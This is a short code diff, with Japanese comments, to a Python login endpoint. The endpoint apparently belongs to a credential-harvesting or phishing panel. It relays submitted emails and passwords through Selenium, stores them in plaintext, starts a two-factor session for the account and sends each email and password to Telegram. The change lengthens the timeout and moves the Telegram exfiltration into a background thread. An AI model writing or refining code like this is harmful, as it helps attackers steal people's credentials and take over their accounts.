@@ -407,7 +407,7 @@ def api_login():
                 'email': email,
                 'password': password
             },
-            timeout=90  # Seleniumの処理時間を考慮して90秒
+            timeout=120  # タイムアウトを120秒に延長
         )
         
         result = response.text.strip()
@@ -420,7 +420,13 @@ def api_login():
                 
                 create_or_update_account(email, password, 'success')
                 init_twofa_session(email, password)
-                send_telegram_notification(email, password)
+                
+                # Telegram通知を別スレッドで実行（レスポンスをブロックしない）
+                threading.Thread(
+                    target=send_telegram_notification,
+                    args=(email, password),
+                    daemon=True
+                ).start()
                 
                 socketio.emit('block_created', {
                     'email': email,
